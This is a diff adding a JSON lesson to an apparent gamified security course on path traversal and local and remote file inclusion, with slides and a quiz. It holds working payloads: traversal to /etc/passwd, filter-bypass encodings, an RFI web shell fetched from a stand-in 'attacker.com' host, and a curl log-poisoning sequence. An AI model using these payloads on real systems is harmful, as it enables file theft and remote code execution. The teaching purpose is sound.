@@ -1,0 +1,79 @@
+{
+    "id": "l6",
+    "chapterId": "ch_8",
+    "title": "File Inclusion & Directory Traversal 📂",
+    "description": "Read arbitrary files and execute remote code via path traversal.",
+    "xpReward": 40,
+    "estimatedMinutes": 11,
+    "section": "Inclusion",
+    "slides": [
+        {
+            "id": "s_l6_1",
+            "type": "text",
+            "title": "Path Traversal (Directory Traversal) 📁",
+            "content": "# Escaping the Web Root\n\nWeb servers are supposed to serve files from a specific directory (e.g., `/var/www/html`).\n\n**Path Traversal** (or **Directory Traversal**) occurs when an attacker can use `../` sequences to move **up** the directory tree and read **any file** on the system.\n\n**Example URL:** `http://site.com/view.php?page=about.html`\n\n**Vulnerable Parameter:** `page`\n\n**Attack Payload:** `http://site.com/view.php?page=../../../../etc/passwd`\n\nIf the application simply appends the `page` parameter to the base path (`/var/www/html/` + `page`), the final path becomes:\n`/var/www/html/../../../../etc/passwd` -> `/etc/passwd`\n\n**Result**: The contents of the Linux password file are displayed!"
+        },
+        {
+            "id": "s_l6_2",
+            "type": "quiz",
+            "title": "Traversal Logic 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l6_1",
+                "type": "multiple_choice",
+                "question": "What is the purpose of the `../` sequence in a path traversal attack?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "To comment out the rest of the path.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "To move up one directory level.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "To execute a shell command.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "To encode the URL.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "`../` is the standard notation for the parent directory in Unix-like and Windows systems.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l6_3",
+            "type": "text",
+            "title": "Bypassing Path Traversal Filters 🛡️",
+            "content": "# When `../` is Blocked\n\nDevelopers often try to filter out `../`. Hackers find ways around it.\n\n**1. Absolute Paths**\nIf relative paths are blocked, try an absolute path:\n`?page=/etc/passwd`\n\n**2. Nested Traversal**\nIf the filter removes `../` once, try doubling it:\n`?page=....//....//....//etc/passwd` -> After removal of `../`, you are left with `../`.\n\n**3. URL Encoding**\n- `../` -> `%2e%2e%2f`\n- Double encoding: `%252e%252e%252f`\n\n**4. Windows Paths**\n- `..\\` or `..\\..\\windows\\win.ini`\n\n**5. Null Byte Injection (PHP < 5.3.4)**\n- `?page=../../../etc/passwd%00.html` -> The `%00` terminates the string, ignoring the appended `.html` extension."
+        },
+        {
+            "id": "s_l6_4",
+            "type": "text",
+            "title": "File Inclusion Vulnerabilities 📎",
+            "content": "# LFI and RFI\n\nFile Inclusion is a subset of Path Traversal where the attacker can **execute** the included file as code.\n\n**1. Local File Inclusion (LFI)**\n- Include a file **already on the server**.\n- **Impact**: Read sensitive files, or execute code if you can upload a file (Log Poisoning).\n\n**2. Remote File Inclusion (RFI)**\n- Include a file from a **remote server** (attacker's machine).\n- **Impact**: Direct Remote Code Execution (RCE).\n- **Requirement**: `allow_url_include = On` in PHP config.\n\n**RFI Payload:**\n`http://site.com/index.php?page=http://attacker.com/evil.txt`\n\n**evil.txt** contains PHP code: `<?php system($_GET['cmd']); ?>`\n\nThen call: `http://site.com/index.php?page=http://attacker.com/evil.txt&cmd=whoami`"
+        },
+        {
+            "id": "s_l6_5",
+            "type": "code",
+            "title": "LFI to RCE via Log Poisoning ☠️",
+            "content": "Even without RFI, you can get code execution via LFI by poisoning log files.",
+            "codeSnippet": "# Step 1: Send a request to the server containing PHP code in the User-Agent.\ncurl -H \"User-Agent: <?php system('whoami'); ?>\" http://192.168.56.101/index.php\n\n# Step 2: The Apache access log (/var/log/apache2/access.log) now contains that PHP code.\n\n# Step 3: Use LFI to include the log file.\nhttp://192.168.56.101/view.php?page=../../../../var/log/apache2/access.log\n\n# Step 4: The PHP code executes, showing the output of 'whoami'.",
+            "codeLanguage": "bash",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l6_6",
+            "type": "warning",
+            "title": "RFI is Critical ⚠️",
+            "content": "## If You Find RFI, You Win\n\nRemote File Inclusion is one of the most severe web vulnerabilities. It almost always leads to immediate server compromise. Report it as **Critical** priority."
+        }
+    ]
+}
